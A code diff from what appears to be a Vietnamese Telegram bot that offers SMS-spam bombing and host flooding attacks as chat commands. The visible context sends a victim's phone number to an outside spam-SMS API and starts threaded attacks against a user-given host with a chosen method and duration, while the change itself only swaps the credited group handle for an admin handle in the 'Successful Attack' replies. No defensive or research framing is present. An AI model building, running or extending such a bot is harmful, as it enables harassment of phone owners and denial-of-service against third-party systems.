@@ -202,7 +202,7 @@ def attack_command(message):
     url = f"https://api.viduchung.info/spam-sms/?phone={phone_number}"
     response = requests.get(url)
 
-    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Số Tấn Công: {phone_number} \n┣➤ Group: @botgioitool \n┗━━━━━━━━━━━━━━➤')
+    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Số Tấn Công: {phone_number} \n┣➤ Admin: @HeinGlobal \n┗━━━━━━━━━━━━━━➤')
 @bot.message_handler(commands=['methods'])
 def methods(message):
     help_text = '''
@@ -316,7 +316,7 @@ def attack_command(message):
 
         attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
         attack_thread.start()
-        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Group: @botgioitool \n┗━━━━━━━━━━━━━━➤')
+        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Admin: @HeinGlobal \n┗━━━━━━━━━━━━━━➤')
     else:
         bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')
 
